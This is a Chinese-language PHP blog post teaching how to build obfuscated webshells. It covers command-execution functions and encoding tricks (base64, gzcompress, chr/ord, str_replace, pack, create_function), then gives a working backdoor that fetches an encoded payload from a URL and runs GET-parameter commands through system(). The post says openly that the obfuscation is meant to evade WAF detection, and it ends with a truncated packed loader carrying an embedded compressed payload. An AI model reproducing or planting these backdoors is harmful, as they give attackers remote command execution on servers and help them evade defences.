---
layout: post
tags: [php]
---

```php
php webshell常见函数
0x1

直接在字符串变量后面加括号， 会调用这个函数：

复制代码
<?php
$s = 'system';
$e = 'assert';
$s('whoami');
$e('phpinfo();');
复制代码
 

0x2

执行命令常用的函数有:

system('命令'）
eval('php code')
assert('php code')
这三个最常用

 

0x3

base64_encode/base64_decode

<?php
$b = base64_encode('whoami');
echo $b.'<br />';
echo base64_decode($b).'<br />';
 

0x4

gzcompress/gzuncompress 压缩数据

<?php
$c = gzcompress('whoami');
echo $c.'<br>';
echo gzuncompress($c)."<br />";
 

0x5

从上面的命令执行， base64加解64编码与gz压缩， 我们可以写一个这样的后门。

先把后门压缩， 再把后门base64_encode(base64编码后防止字符原因代码出错)。

如果后门是一个php代码的话， 在最后我们可以用assert或eval执行它。

在php中， 有一个这样的函数：

file_get_contents(url）
用这个函数可以远程获取文件内容保存到变量中：

$shell = file_get_contents('http://localhost/shell.jpg')
开始测试， 从最简单例子开始。

制作gzcompress与base64_encode编码过的文件：

复制代码
<?php
$c = 'system';
$data = gzcompress($c);
$file_data = base64_encode($data);
echo $file_data;
fwrite(fopen('shell.txt', 'w'), $file_data);
复制代码
这样我们就创了一个压缩后再64编码的system字符串

使用:

复制代码
<?php
$c = file_get_contents('http://localhost/shell.txt');
#获取数据
$s = gzuncompress(base64_decode($c));
#解密数据

$s($_GET[session]);
#执行命令
复制代码
 

那么问题来了， 我们为什么要转了一大圈再回来呢？

原因很简单， 就是你压缩后的数据， 有可能一些WAF并不会检测到内容存在危险。

 

 

0x6

ascii转码函数: chr/ord

复制代码
<?php
$str = 'system';
for($count = 0; $count < strlen($str); $count++){
    echo substr($str, $count, 1).'~'.ord(substr($str, $count, 1)).'<br />';
}
/*
s~115
y~121
s~115
t~116
e~101
m~109*/
复制代码
 

0x7

str_replace字符替换函数:

<?php
$s = str_replace('p','','pspypsptpepmp');
echo $s;
#system
 

 

0x8

create_fuction()创建匿名函数：

<?php
#create_function('参数列表', 'php代码字符串');
$info = create_function('','phpinfo();');
$info();
 

0x9

pack函数

pack('格式', 十六进制字符串)

pack函数有点复杂， 但不常用， 如果你要把一个十六进制转成字符， 可以这样:

复制代码
<?php
$x = bin2hex('system');
$s = PACK('H*', $x);
echo $s.'<br />';
$s('whoami');
复制代码
pack关键用法就是， 我们可以把一些第感的函数， 先转成16进制， 再 pack回来。

比如， create_function('', $shell)中， $shell为php code代码， 我们可以在php code中利用隐藏一些敏感函数。

复制代码
<?php
$shell=PACK('H*','2470617373776F72643D27').$password.
PACK('H*','273B247368656C6C6E616D653D27').$Username.
PACK('H*','273B246D7975726C3D27').$Url.
PACK('H*','273B6576616C28677A756E636F6D7072657373286261736536345F6465636F64652827').'
eJzs/Xt3HNd5Jor/zazl71Buw2rAwqXu1UUQsOpKgheABEBSlK
iD02g0gCYaaKi7QYCi+GEczZxoHM+KJetiWzdbkmNZsi1FkmXH
yzOT8WQyk/HPcybJTJKZJLN+z7N3VXVVX0BQtpPJOoZEoLtq3/
d73+/77tb6WqdbbXfHJ2Y/8zsb9c3GXn28vHunurHRrnc65cmx
tZVo+Vq0/Hh5JVheuLy6Fi9cjBa9S1H5iXyN/Vanu18VFfjnsN
XeyL/ubNebzb3qbh3vs8/FHg/aTbwUf/misTn+yFa9u7Zb3WrU
.......


$f = create_function('', $shell);
$f();
复制代码
 
```